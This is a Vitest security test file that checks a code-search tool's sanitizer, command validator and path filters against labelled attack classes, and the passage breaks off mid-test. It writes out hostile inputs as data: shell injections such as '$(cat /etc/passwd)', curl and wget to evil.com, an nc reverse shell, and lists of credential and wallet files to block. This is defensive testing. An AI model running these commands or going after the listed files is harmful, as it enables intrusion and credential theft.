import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { ContentSanitizer } from 'octocode-security/contentSanitizer';
import { maskSensitiveData } from 'octocode-security/mask';
import { validateCommand } from 'octocode-security/commandValidator';
import { PathValidator } from 'octocode-security/pathValidator';
import {
  shouldIgnore,
  shouldIgnorePath,
  shouldIgnoreFile,
} from 'octocode-security/ignoredPathFilter';
import {
  withSecurityValidation,
  withBasicSecurityValidation,
} from 'octocode-security/withSecurityValidation';
import {
  createResponseFormat,
  sanitizeStructuredContent,
  createRoleBasedResult,
} from '../../../octocode-tools-core/src/responses.js';
import { executeBulkOperation } from '../../../octocode-tools-core/src/utils/response/bulk.js';
import { sanitizeCallToolResult } from '@octocodeai/octocode-tools-core';
import type { CallToolResult } from '@modelcontextprotocol/sdk/types.js';

vi.mock('octocode-shared', () => ({
  getConfigSync: () => ({
    output: { format: 'yaml', pagination: { defaultCharLength: 2000 } },
  }),
  DEFAULT_OUTPUT_CONFIG: {
    format: 'yaml',
    pagination: { defaultCharLength: 2000 },
  },
  resolveTokenFull: vi.fn(async () => null),
  getTokenFromEnv: vi.fn(() => null),
  getEnvTokenSource: vi.fn(() => null),
  getOrCreateSession: vi.fn(() => ({
    sessionId: '00000000-0000-4000-8000-000000000000',
    createdAt: new Date().toISOString(),
    lastActiveAt: new Date().toISOString(),
    stats: { toolCalls: 0, errors: 0, rateLimits: 0 },
  })),
  incrementToolCalls: vi.fn(() => ({ success: true })),
  incrementErrors: vi.fn(() => ({ success: true })),
  incrementToolCharSavings: vi.fn(() => ({ success: true })),
}));

const SECRETS = {
  AWS_KEY: 'AKIAIOSFODNN7EXAMPLE',
  AWS_SECRET:
    'aws_secret_access_key = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"',
  GITHUB_TOKEN: 'ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef01234567',
  GITLAB_TOKEN: 'glpat-ABCDEFGHIJKLMNOPQRST',
  STRIPE_KEY: 'sk_live_4eC39HqLyjWDarjtT1zdp7dc',
  OPENAI_KEY: 'sk-proj-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop1234567890',
  PRIVATE_KEY:
    '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGcY5unA\n-----END RSA PRIVATE KEY-----',
  SLACK_TOKEN: 'xoxb-1234567890123-1234567890123-ABCDEFGHIJKLMNOPqrstuvwx',
  JWT: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c',
  VAULT_TOKEN: 'hvs.CAESIJNYsBrSCxgL2QkSMBHqn2P0AICn123456789',
  ANTHROPIC_KEY:
    'sk-ant-api03-ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnop1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefgh1234',
  CONNECTION_STRING:
    'postgresql://admin:s3cretPa$$w0rd@db.example.com:5432/production',
  BASIC_AUTH: 'Basic dXNlcjpwYXNzd29yZDEyMzQ1Njc4OQ==',
  AGE_KEY:
    'AGE-SECRET-KEY-1QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ',
} as const;

function assertSecretAbsent(
  output: string,
  secretName: string,
  secretValue: string
): void {
  expect(output).not.toContain(secretValue);
  if (output.includes(secretValue)) {
    throw new Error(`SECURITY BREACH: ${secretName} leaked through output`);
  }
}

function assertAllSecretsAbsent(output: string): void {
  for (const [name, value] of Object.entries(SECRETS)) {
    assertSecretAbsent(output, name, value);
  }
}

function deepStringCollect(obj: unknown, path = ''): string[] {
  const strings: string[] = [];
  if (typeof obj === 'string') return [obj];
  if (Array.isArray(obj)) {
    obj.forEach((item, i) =>
      strings.push(...deepStringCollect(item, `${path}[${i}]`))
    );
  } else if (obj && typeof obj === 'object') {
    for (const [key, value] of Object.entries(obj)) {
      strings.push(...deepStringCollect(value, `${path}.${key}`));
    }
  }
  return strings;
}

function assertObjectSecretsAbsent(obj: unknown): void {
  const allStrings = deepStringCollect(obj);
  for (const str of allStrings) {
    assertAllSecretsAbsent(str);
  }
}

describe('ATTACK-01: Regex Evasion', () => {
  it('should catch secrets with surrounding whitespace noise', () => {
    const padded = `   \t  ${SECRETS.AWS_KEY}  \n  `;
    const result = ContentSanitizer.sanitizeContent(padded);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
  });

  it('should catch secrets embedded in JSON strings', () => {
    const json = JSON.stringify({
      api_key: SECRETS.STRIPE_KEY,
      nested: { token: SECRETS.GITHUB_TOKEN },
    });
    const result = ContentSanitizer.sanitizeContent(json);
    assertSecretAbsent(result.content, 'STRIPE_KEY', SECRETS.STRIPE_KEY);
    assertSecretAbsent(result.content, 'GITHUB_TOKEN', SECRETS.GITHUB_TOKEN);
  });

  it('should catch secrets embedded in YAML', () => {
    const yaml = `
config:
  aws_key: ${SECRETS.AWS_KEY}
  stripe: ${SECRETS.STRIPE_KEY}
  token: ${SECRETS.GITHUB_TOKEN}
`;
    const result = ContentSanitizer.sanitizeContent(yaml);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
    assertSecretAbsent(result.content, 'STRIPE_KEY', SECRETS.STRIPE_KEY);
  });

  it('should catch secrets embedded in code comments', () => {
    const code = `
const key = "${SECRETS.AWS_KEY}";
/* debug: ${SECRETS.STRIPE_KEY} */
# token: ${SECRETS.GITHUB_TOKEN}
`;
    const result = ContentSanitizer.sanitizeContent(code);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
    assertSecretAbsent(result.content, 'STRIPE_KEY', SECRETS.STRIPE_KEY);
    assertSecretAbsent(result.content, 'GITHUB_TOKEN', SECRETS.GITHUB_TOKEN);
  });

  it('should catch secrets in multiline strings', () => {
    const multiline = `Line 1: some data\nLine 2: ${SECRETS.PRIVATE_KEY}\nLine 3: more data`;
    const result = ContentSanitizer.sanitizeContent(multiline);
    expect(result.content).not.toContain('BEGIN RSA PRIVATE KEY');
  });

  it('FIXED: private keys with extra whitespace in markers are now caught', () => {
    const paddedKey =
      '-----BEGIN  RSA  PRIVATE KEY-----\nMIIEowIBAAKCAQEA0Z3VS5JJcds3xfn\n-----END  RSA  PRIVATE KEY-----';
    const result = ContentSanitizer.sanitizeContent(paddedKey);
    expect(result.content).not.toContain('MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn');
  });

  it('should catch multiple secrets in the same string', () => {
    const multi = `Key1: ${SECRETS.AWS_KEY}, Key2: ${SECRETS.STRIPE_KEY}, Key3: ${SECRETS.GITHUB_TOKEN}`;
    const result = ContentSanitizer.sanitizeContent(multi);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
    assertSecretAbsent(result.content, 'STRIPE_KEY', SECRETS.STRIPE_KEY);
    assertSecretAbsent(result.content, 'GITHUB_TOKEN', SECRETS.GITHUB_TOKEN);
  });

  it('should handle secrets at string boundaries (start/end)', () => {
    const atStart = SECRETS.AWS_KEY;
    const atEnd = `some prefix ${SECRETS.AWS_KEY}`;
    expect(ContentSanitizer.sanitizeContent(atStart).content).not.toContain(
      SECRETS.AWS_KEY
    );
    expect(ContentSanitizer.sanitizeContent(atEnd).content).not.toContain(
      SECRETS.AWS_KEY
    );
  });

  it('should catch secrets in URL query parameters', () => {
    const url = `https://api.example.com/v1/data?token=${SECRETS.GITHUB_TOKEN}&key=${SECRETS.AWS_KEY}`;
    const result = ContentSanitizer.sanitizeContent(url);
    assertSecretAbsent(result.content, 'GITHUB_TOKEN', SECRETS.GITHUB_TOKEN);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
  });

  it('should catch JWT tokens in Authorization headers', () => {
    const header = `Authorization: Bearer ${SECRETS.JWT}`;
    const result = ContentSanitizer.sanitizeContent(header);
    assertSecretAbsent(result.content, 'JWT', SECRETS.JWT);
  });

  it('should catch connection strings with embedded credentials', () => {
    const result = ContentSanitizer.sanitizeContent(SECRETS.CONNECTION_STRING);
    assertSecretAbsent(
      result.content,
      'CONNECTION_STRING',
      SECRETS.CONNECTION_STRING
    );
  });
});

describe('ATTACK-02: Command Injection', () => {
  it('should block shell metacharacters in rg arguments', () => {
    expect(validateCommand('rg', ['pattern', '; rm -rf /']).isValid).toBe(
      false
    );
    expect(validateCommand('rg', ['pattern', '$(whoami)']).isValid).toBe(false);
    expect(validateCommand('rg', ['pattern', '`id`']).isValid).toBe(false);
    expect(
      validateCommand('rg', ['pattern', '| cat /etc/passwd']).isValid
    ).toBe(false);
  });

  it('should block shell metacharacters in find arguments', () => {
    expect(
      validateCommand('find', ['/workspace', '-exec', 'rm', '-rf', '/']).isValid
    ).toBe(false);
    expect(validateCommand('find', ['/workspace', '-delete']).isValid).toBe(
      false
    );
    expect(
      validateCommand('find', ['/workspace', '-execdir', 'sh', '-c', 'evil'])
        .isValid
    ).toBe(false);
  });

  it('should only allow whitelisted commands', () => {
    expect(validateCommand('curl', ['http://evil.com']).isValid).toBe(false);
    expect(validateCommand('wget', ['http://evil.com']).isValid).toBe(false);
    expect(
      validateCommand('nc', ['-e', '/bin/sh', '1.2.3.4', '4444']).isValid
    ).toBe(false);
    expect(
      validateCommand('python', ['-c', 'import os; os.system("id")']).isValid
    ).toBe(false);
    expect(validateCommand('bash', ['-c', 'cat /etc/passwd']).isValid).toBe(
      false
    );
    expect(validateCommand('sh', ['-c', 'whoami']).isValid).toBe(false);
    expect(validateCommand('node', ['-e', 'process.exit()']).isValid).toBe(
      false
    );
  });

  it('should block variable expansion in search patterns', () => {
    expect(validateCommand('rg', ['${HOME}']).isValid).toBe(false);
    expect(validateCommand('rg', ['$(cat /etc/passwd)']).isValid).toBe(false);
  });

  it('should block disallowed rg flags that could enable code execution', () => {
    expect(
      validateCommand('rg', ['--pre', 'evil-script', 'pattern']).isValid
    ).toBe(false);
    expect(
      validateCommand('rg', ['--pre-glob', '*.py', 'pattern']).isValid
    ).toBe(false);
  });

  it('should block dangerous git subcommands', () => {
    expect(validateCommand('git', ['push']).isValid).toBe(false);
    expect(validateCommand('git', ['commit', '-m', 'evil']).isValid).toBe(
      false
    );
    expect(validateCommand('git', ['checkout', 'main']).isValid).toBe(false);
    expect(validateCommand('git', ['reset', '--hard']).isValid).toBe(false);
    expect(validateCommand('git', ['rm', '-rf', '.']).isValid).toBe(false);
    expect(
      validateCommand('git', ['config', 'user.email', 'evil@hacker.com'])
        .isValid
    ).toBe(false);
  });

  it('should block git clone with dangerous protocols', () => {
    expect(
      validateCommand('git', ['clone', 'file:///etc/passwd']).isValid
    ).toBe(false);
    expect(
      validateCommand('git', ['clone', 'git://evil.com/repo']).isValid
    ).toBe(false);
    expect(
      validateCommand('git', ['clone', 'http://evil.com/repo']).isValid
    ).toBe(false);
  });

  it('should block git -c with dangerous config keys', () => {
    expect(
      validateCommand('git', [
        '-c',
        'core.sshCommand=evil',
        'clone',
        'https://x.com/r',
      ]).isValid
    ).toBe(false);
    expect(
      validateCommand('git', [
        '-c',
        'core.hooksPath=/tmp/evil',
        'clone',
        'https://x.com/r',
      ]).isValid
    ).toBe(false);
    expect(
      validateCommand('git', [
        '-c',
        'credential.helper=evil',
        'clone',
        'https://x.com/r',
      ]).isValid
    ).toBe(false);
    expect(
      validateCommand('git', [
        '-c',
        'core.gitProxy=evil',
        'clone',
        'https://x.com/r',
      ]).isValid
    ).toBe(false);
  });

  it('should block null byte injection in arguments (semicolon caught by DANGEROUS_PATTERNS)', () => {
    const result = validateCommand('rg', [
      'pattern\x00; rm -rf /',
      '/workspace',
    ]);
    expect(result.isValid).toBe(false);
  });

  it('should require args to be an array', () => {
    expect(validateCommand('rg', null as unknown as string[]).isValid).toBe(
      false
    );
    expect(
      validateCommand('rg', undefined as unknown as string[]).isValid
    ).toBe(false);
    expect(
      validateCommand('rg', 'not-array' as unknown as string[]).isValid
    ).toBe(false);
  });
});

describe('ATTACK-03: Path Traversal', () => {
  let validator: PathValidator;

  beforeEach(() => {
    validator = new PathValidator({
      workspaceRoot: '/workspace/project',
      includeHomeDir: false,
      additionalRoots: [],
    });
  });

  it('should block basic ../ traversal', () => {
    expect(
      validator.validate('/workspace/project/../../etc/passwd').isValid
    ).toBe(false);
  });

  it('should block absolute path to /etc/passwd', () => {
    expect(validator.validate('/etc/passwd').isValid).toBe(false);
  });

  it('should block absolute path to /etc/shadow', () => {
    expect(validator.validate('/etc/shadow').isValid).toBe(false);
  });

  it('should block path to home directory SSH keys', () => {
    const homeValidator = new PathValidator({
      workspaceRoot: '/workspace',
      includeHomeDir: true,
    });
    const result = homeValidator.validate(`${process.env.HOME}/.ssh/id_rsa`);
    expect(result.isValid).toBe(false);
  });

  it('should block path to AWS credentials', () => {
    const homeValidator = new PathValidator({
      workspaceRoot: '/workspace',
      includeHomeDir: true,
    });
    const result = homeValidator.validate(
      `${process.env.HOME}/.aws/credentials`
    );
    expect(result.isValid).toBe(false);
  });

  it('should handle URL-encoded paths (OS does not decode %2e as .)', () => {
    const result = validator.validate(
      '/workspace/project/%2e%2e/%2e%2e/etc/passwd'
    );
    expect(result.isValid).toBe(true);
  });

  it('should handle paths with dots that resolve within workspace', () => {
    const result = validator.validate(
      '/workspace/project/....//....//etc/passwd'
    );
    expect(result.isValid).toBe(true);
  });

  it('should block traversal via current directory tricks', () => {
    expect(
      validator.validate('/workspace/project/./../../etc/passwd').isValid
    ).toBe(false);
  });

  it('should allow valid workspace paths', () => {
    expect(validator.validate('/workspace/project/src/index.ts').isValid).toBe(
      true
    );
    expect(validator.validate('/workspace/project').isValid).toBe(true);
  });

  it('should block .env files via shouldIgnore', () => {
    expect(shouldIgnoreFile('.env')).toBe(true);
    expect(shouldIgnoreFile('.env.production')).toBe(true);
    expect(shouldIgnoreFile('.env.local')).toBe(true);
  });

  it('should block .ssh directory access', () => {
    expect(shouldIgnorePath('.ssh')).toBe(true);
    expect(shouldIgnorePath('.ssh/id_rsa')).toBe(true);
    expect(shouldIgnore('/home/user/.ssh/id_rsa')).toBe(true);
  });

  it('should block .git directory access', () => {
    expect(shouldIgnorePath('.git')).toBe(true);
    expect(shouldIgnorePath('.git/config')).toBe(true);
    expect(shouldIgnore('/workspace/.git/HEAD')).toBe(true);
  });

  it('should block credential files', () => {
    expect(shouldIgnoreFile('.npmrc')).toBe(true);
    expect(shouldIgnoreFile('.netrc')).toBe(true);
    expect(shouldIgnoreFile('.pypirc')).toBe(true);
    expect(shouldIgnoreFile('credentials')).toBe(true);
    expect(shouldIgnoreFile('.git-credentials')).toBe(true);
  });

  it('should block private key files', () => {
    expect(shouldIgnoreFile('id_rsa')).toBe(true);
    expect(shouldIgnoreFile('id_ed25519')).toBe(true);
    expect(shouldIgnoreFile('server.key')).toBe(true);
    expect(shouldIgnoreFile('server.pem')).toBe(true);
    expect(shouldIgnoreFile('private.key')).toBe(true);
  });

  it('should block database history files', () => {
    expect(shouldIgnoreFile('.mysql_history')).toBe(true);
    expect(shouldIgnoreFile('.psql_history')).toBe(true);
    expect(shouldIgnoreFile('.bash_history')).toBe(true);
  });

  it('should block cryptocurrency wallet files', () => {
    expect(shouldIgnoreFile('wallet.dat')).toBe(true);
    expect(shouldIgnorePath('.bitcoin')).toBe(true);
    expect(shouldIgnorePath('.ethereum')).toBe(true);
  });

  it('should block browser credential storage', () => {
    expect(shouldIgnoreFile('Login Data')).toBe(true);
    expect(shouldIgnoreFile('Cookies')).toBe(true);
  });

  it('should block password manager databases', () => {
    expect(shouldIgnoreFile('passwords.kdbx')).toBe(true);
    expect(shouldIgnoreFile('keepass.kdbx')).toBe(true);
  });
});

describe('ATTACK-05: Prototype Pollution', () => {
  it('should block __proto__ key from JSON-parsed input', () => {
    const malicious = JSON.parse('{"__proto__": {"isAdmin": true}}');
    const result = ContentSanitizer.validateInputParameters(malicious);
    expect(result.isValid).toBe(false);
    expect(result.sanitizedParams).not.toHaveProperty('__proto__');
  });

  it('should block constructor key', () => {
    const result = ContentSanitizer.validateInputParameters({
      constructor: { prototype: { isAdmin: true } },
    });
    expect(result.isValid).toBe(false);
    expect(result.sanitizedParams).not.toHaveProperty('constructor');
  });

  it('should block prototype key', () => {
    const result = ContentSanitizer.validateInputParameters({
      prototype: { isAdmin: true },
    });
    expect(result.isValid).toBe(false);
    expect(result.sanitizedParams).not.toHaveProperty('prototype');
  });

  it('FIXED: nested __proto__ inside arrays now propagates isValid=false', () => {
    const malicious = JSON.parse(
      '{"queries": [{"__proto__": {"polluted": true}}]}'
    );
    const result = ContentSanitizer.validateInputParameters(malicious);
    expect(result.isValid).toBe(false);
    expect(
      result.warnings.some(
        w => w.includes('__proto__') || w.includes('Dangerous')
      )
    ).toBe(true);
  });

  it('should prevent prototype pollution from reaching Object.prototype', () => {
    const before = ({} as Record<string, unknown>).isAdmin;
    ContentSanitizer.validateInputParameters({
      __proto__: { isAdmin: true },
    });
    const after = ({} as Record<string, unknown>).isAdmin;
    expect(before).toBeUndefined();
    expect(after).toBeUndefined();
  });
});

describe('ATTACK-06: Input Size Bombs', () => {
  it('should truncate strings exceeding 10,000 characters', () => {
    const longString = 'A'.repeat(50000);
    const result = ContentSanitizer.validateInputParameters({
      data: longString,
    });
    const sanitized = result.sanitizedParams.data as string;
    expect(sanitized.length).toBeLessThanOrEqual(10000);
  });

  it('should truncate arrays exceeding 100 items', () => {
    const longArray = Array.from({ length: 200 }, (_, i) => `item${i}`);
    const result = ContentSanitizer.validateInputParameters({
      items: longArray,
    });
    const sanitized = result.sanitizedParams.items as string[];
    expect(sanitized.length).toBeLessThanOrEqual(100);
  });

  it('should limit nesting depth to prevent stack overflow', () => {
    let nested: Record<string, unknown> = { value: 'deep' };
    for (let i = 0; i < 25; i++) {
      nested = { child: nested };
    }
    const result = ContentSanitizer.validateInputParameters(nested);
    expect(result.isValid).toBe(false);
    expect(result.warnings.some(w => w.includes('depth'))).toBe(true);
  });

  it('should handle circular references gracefully', () => {
    const obj: Record<string, unknown> = { name: 'test' };
    obj.self = obj;
    const result = ContentSanitizer.validateInputParameters(obj);
    expect(result.isValid).toBe(false);
  });
});

describe('ATTACK-07: Output Channel Bypass', () => {
  it('should sanitize secrets in text content blocks', () => {
    for (const [name, secret] of Object.entries(SECRETS)) {
      const output = createResponseFormat({ data: { content: secret } });
      assertSecretAbsent(output, name, secret);
    }
  });

  it('should sanitize secrets in structuredContent via createRoleBasedResult', () => {
    const result = createRoleBasedResult({
      assistant: { summary: 'Found results' },
      data: {
        content: SECRETS.AWS_KEY,
        nested: { token: SECRETS.GITHUB_TOKEN },
        array: [SECRETS.STRIPE_KEY],
      },
    });

    assertObjectSecretsAbsent(result.structuredContent);
  });

  it('should sanitize secrets in bulk tool structuredContent', async () => {
    const result = await executeBulkOperation(
      [{ id: 'q1', query: 'test' }],
      async () => ({
        content: `File contains ${SECRETS.AWS_KEY} and ${SECRETS.PRIVATE_KEY}`,
        matches: [SECRETS.GITHUB_TOKEN, SECRETS.STRIPE_KEY],
      }),
      { toolName: 'test', keysPriority: ['results'] }
    );

    const text = result.content.find(c => c.type === 'text')?.text || '';
    assertAllSecretsAbsent(text);

    assertObjectSecretsAbsent(result.structuredContent);
  });

  it('DESIGN-NOTE: createRoleBasedResult text blocks are NOT sanitized (wrapper catches them)', () => {
    const result = createRoleBasedResult({
      assistant: {
        summary: `Error: Failed to connect with token ${SECRETS.GITHUB_TOKEN}`,
      },
      data: { error: `Auth failed: ${SECRETS.AWS_KEY}` },
      isError: true,
    });

    const text = result.content
      .map(c => (c as { text?: string }).text)
      .join(' ');
    expect(text).toContain(SECRETS.GITHUB_TOKEN);

    assertObjectSecretsAbsent(result.structuredContent);

    const dataBlock = result.content.find(
      c =>
        (c as { annotations?: { priority?: number } }).annotations?.priority ===
        0.3
    );
    if (dataBlock && 'text' in dataBlock) {
      assertSecretAbsent(dataBlock.text as string, 'AWS_KEY', SECRETS.AWS_KEY);
    }
  });

  it('should sanitize the sanitizeStructuredContent function directly', () => {
    const data = {
      level1: SECRETS.AWS_KEY,
      level2: {
        a: SECRETS.STRIPE_KEY,
        b: {
          c: SECRETS.PRIVATE_KEY,
          d: [SECRETS.GITHUB_TOKEN, SECRETS.JWT],
        },
      },
      array: [{ key: SECRETS.SLACK_TOKEN }],
    };

    const sanitized = sanitizeStructuredContent(data);
    assertObjectSecretsAbsent(sanitized);
  });
});

describe('ATTACK-08: Security Wrapper Bypass', () => {
  it('should sanitize secrets in input parameters', async () => {
    const handler = vi.fn().mockResolvedValue({
      content: [{ type: 'text', text: 'ok' }],
    });

    const wrapped = withBasicSecurityValidation(handler);
    await wrapped({ searchPattern: SECRETS.AWS_KEY, path: '/workspace' });

    if (handler.mock.calls.length > 0) {
      const passedArgs = handler.mock.calls[0]![0] as Record<string, unknown>;
      expect(passedArgs.searchPattern).not.toContain(SECRETS.AWS_KEY);
    }
  });

  it('should reject invalid input types', async () => {
    const handler = vi.fn().mockResolvedValue({
      content: [{ type: 'text', text: 'ok' }],
    });

    const wrapped = withBasicSecurityValidation(handler);
    const result = await wrapped(null);
    expect(result.isError).toBe(true);
    expect(handler).not.toHaveBeenCalled();
  });

  it('should sanitize output from tool handlers (via unified proxy layer)', async () => {
    const handler = vi.fn().mockResolvedValue({
      content: [{ type: 'text', text: `Found: ${SECRETS.AWS_KEY}` }],
    });

    const wrapped = withBasicSecurityValidation(handler);
    const rawResult = await wrapped({ query: 'test' });
    const result = sanitizeCallToolResult(
      rawResult as unknown as CallToolResult
    );

    const text = result.content.find(c => c.type === 'text')?.text || '';
    assertSecretAbsent(text, 'AWS_KEY', SECRETS.AWS_KEY);
  });

  it('should handle handler errors without leaking secrets (via unified proxy layer)', async () => {
    const handler = vi
      .fn()
      .mockRejectedValue(
        new Error(`Connection failed: token=${SECRETS.GITHUB_TOKEN}`)
      );

    const wrapped = withSecurityValidation('testTool', handler);
    const rawResult = await wrapped({ query: 'test' }, {});
    const result = sanitizeCallToolResult(
      rawResult as unknown as CallToolResult
    );

    const text = result.content.find(c => c.type === 'text')?.text || '';
    assertSecretAbsent(text, 'GITHUB_TOKEN', SECRETS.GITHUB_TOKEN);
  });

  it('should enforce timeout to prevent hanging attacks', async () => {
    const handler = vi
      .fn()
      .mockImplementation(
        () => new Promise(resolve => setTimeout(resolve, 5000))
      );

    const wrapped = withBasicSecurityValidation(handler, 'slowTool', {
      timeoutMs: 100,
    });
    const result = await wrapped({ query: 'test' });
    expect(result.isError).toBe(true);
    const text = result.content.find(c => c.type === 'text')?.text || '';
    expect(text).toContain('timed out');
  });
});

describe('ATTACK-09: Double-Layer Sanitization', () => {
  for (const [name, secret] of Object.entries(SECRETS)) {
    it(`should catch ${name} through both sanitization layers`, () => {
      const input = `Data: ${secret}`;

      const layer1 = ContentSanitizer.sanitizeContent(input);

      const layer2 = maskSensitiveData(input);

      const combined = maskSensitiveData(layer1.content);

      const caught = layer1.hasSecrets || layer2 !== input;
      expect(caught).toBe(true);

      expect(combined).not.toContain(secret);
    });
  }
});

describe('ATTACK-10: Type Confusion', () => {
  it('should handle non-string content gracefully', () => {
    // @ts-expect-error - deliberate type confusion attack
    const result = ContentSanitizer.sanitizeContent(12345);
    expect(result.content).toBe('12345');
    expect(result.hasSecrets).toBe(false);
  });

  it('should handle null content gracefully', () => {
    // @ts-expect-error - deliberate type confusion attack
    const result = ContentSanitizer.sanitizeContent(null);
    expect(result.content).toBe('');
  });

  it('should handle undefined content gracefully', () => {
    // @ts-expect-error - deliberate type confusion attack
    const result = ContentSanitizer.sanitizeContent(undefined);
    expect(result.content).toBe('');
  });

  it('should handle boolean input parameters', () => {
    // @ts-expect-error - deliberate type confusion attack
    const result = ContentSanitizer.validateInputParameters(true);
    expect(result.isValid).toBe(false);
  });

  it('should handle number input parameters', () => {
    // @ts-expect-error - deliberate type confusion attack
    const result = ContentSanitizer.validateInputParameters(42);
    expect(result.isValid).toBe(false);
  });

  it('should handle string input parameters', () => {
    // @ts-expect-error - deliberate type confusion attack
    const result = ContentSanitizer.validateInputParameters('string');
    expect(result.isValid).toBe(false);
  });

  it('should handle mixed-type arrays in input', () => {
    const result = ContentSanitizer.validateInputParameters({
      data: [1, 'two', true, null, { nested: 'value' }, [1, 2, 3]],
    });
    expect(result.isValid).toBe(true);
  });

  it('should handle empty string key in input', () => {
    const result = ContentSanitizer.validateInputParameters({ '': 'value' });
    expect(result.isValid).toBe(false);
  });

  it('should sanitize structuredContent with non-object data', () => {
    expect(sanitizeStructuredContent(null)).toBe(null);
    expect(sanitizeStructuredContent(undefined)).toBe(undefined);
    expect(sanitizeStructuredContent(42)).toBe(42);
    expect(sanitizeStructuredContent(true)).toBe(true);
  });
});

describe('ATTACK-11: Mask Quality', () => {
  it('should not leak the first half of a secret via masking', () => {
    const masked = maskSensitiveData(SECRETS.AWS_KEY);
    if (masked !== SECRETS.AWS_KEY) {
      let maxRun = 0;
      let currentRun = 0;
      for (let i = 0; i < masked.length && i < SECRETS.AWS_KEY.length; i++) {
        if (masked[i] === SECRETS.AWS_KEY[i]) {
          currentRun++;
          maxRun = Math.max(maxRun, currentRun);
        } else {
          currentRun = 0;
        }
      }
      expect(maxRun).toBeLessThan(SECRETS.AWS_KEY.length / 2);
    }
  });

  it('should mask at least 40% of characters', () => {
    for (const secret of Object.values(SECRETS)) {
      const masked = maskSensitiveData(secret);
      if (masked !== secret) {
        const starCount = [...masked].filter(c => c === '*').length;
        const ratio = starCount / masked.length;
        expect(ratio).toBeGreaterThan(0.3);
      }
    }
  });

  it('should not produce empty string from masking', () => {
    for (const secret of Object.values(SECRETS)) {
      const masked = maskSensitiveData(secret);
      expect(masked.length).toBeGreaterThan(0);
    }
  });
});

describe('ATTACK-12: Environment Variable Attacks', () => {
  const origEnv = { ...process.env };

  afterEach(() => {
    process.env = { ...origEnv };
  });

  it('should not allow ALLOWED_PATHS to grant access to /etc', () => {
    process.env.ALLOWED_PATHS = '/etc';
    new PathValidator({
      workspaceRoot: '/workspace',
      includeHomeDir: false,
    });
    expect(shouldIgnoreFile('.env')).toBe(true);
    expect(shouldIgnorePath('.ssh')).toBe(true);
  });
});

describe('ATTACK-13: Content Sanitization Edge Cases', () => {
  it('should handle empty string', () => {
    const result = ContentSanitizer.sanitizeContent('');
    expect(result.content).toBe('');
    expect(result.hasSecrets).toBe(false);
  });

  it('FIXED: very long content (2M+ chars) now uses chunked sanitization', () => {
    const longContent =
      'x'.repeat(1_000_000) +
      ' ' +
      SECRETS.AWS_KEY +
      ' ' +
      'x'.repeat(1_000_000);
    const result = ContentSanitizer.sanitizeContent(longContent);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
  });

  it('should handle content with only special characters', () => {
    const special = '!@#$%^&*()_+{}|:"<>?[]\\;\',./-=`~';
    const result = ContentSanitizer.sanitizeContent(special);
    expect(result.hasSecrets).toBe(false);
  });

  it('should handle content with unicode characters around secrets', () => {
    const unicode = `\u200B${SECRETS.AWS_KEY}\u200B`;
    const result = ContentSanitizer.sanitizeContent(unicode);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
  });

  it('should handle content with null bytes', () => {
    const withNull = `before\x00${SECRETS.AWS_KEY}\x00after`;
    const result = ContentSanitizer.sanitizeContent(withNull);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
  });

  it('should handle content with backslash-escaped quotes around secrets', () => {
    const escaped = `\\"${SECRETS.STRIPE_KEY}\\"`;
    const result = ContentSanitizer.sanitizeContent(escaped);
    assertSecretAbsent(result.content, 'STRIPE_KEY', SECRETS.STRIPE_KEY);
  });

  it('should handle content with HTML entities', () => {
    const html = `<div data-token="${SECRETS.GITHUB_TOKEN}"></div>`;
    const result = ContentSanitizer.sanitizeContent(html);
    assertSecretAbsent(result.content, 'GITHUB_TOKEN', SECRETS.GITHUB_TOKEN);
  });

  it('should handle repeated secrets (same secret many times)', () => {
    const repeated = Array(50).fill(SECRETS.AWS_KEY).join(' ');
    const result = ContentSanitizer.sanitizeContent(repeated);
    assertSecretAbsent(result.content, 'AWS_KEY', SECRETS.AWS_KEY);
  });
});

describe('ATTACK-14: Find Command Abuse', () => {
  it('should block -printf (info leak)', () => {
    expect(
      validateCommand('find', ['/workspace', '-printf', '%p %u %g\\n']).isValid
    ).toBe(false);
  });

  it('should block -ls (info leak)', () => {
    expect(validateCommand('find', ['/workspace', '-ls']).isValid).toBe(false);
  });

  it('should block -fprintf (write to file)', () => {
    expect(
      validateCommand('find', ['/workspace', '-fprintf', '/tmp/out', '%p'])
        .isValid
    ).toBe(false);
  });

  it('should block -fprint0', () => {
    expect(
      validateCommand('find', ['/workspace', '-fprint0', '/tmp/out']).isValid
    ).toBe(false);
  });

  it('should block -ok (interactive exec)', () => {
    expect(
      validateCommand('find', ['/workspace', '-ok', 'rm', '{}']).isValid
    ).toBe(false);
  });

  it('should block -okdir', () => {
    expect(
      validateCommand('find', ['/workspace', '-okdir', 'rm', '{}']).isValid
    ).toBe(false);
  });

  it('should allow legitimate find with -name and -type', () => {
    expect(
      validateCommand('find', ['/workspace', '-name', '*.ts', '-type', 'f'])
        .isValid
    ).toBe(true);
  });
});

describe('ATTACK-15: Git Sparse-Checkout Abuse', () => {
  it('should allow legitimate sparse-checkout actions', () => {
    expect(
      validateCommand('git', ['sparse-checkout', 'init', '--cone']).isValid
    ).toBe(true);
    expect(
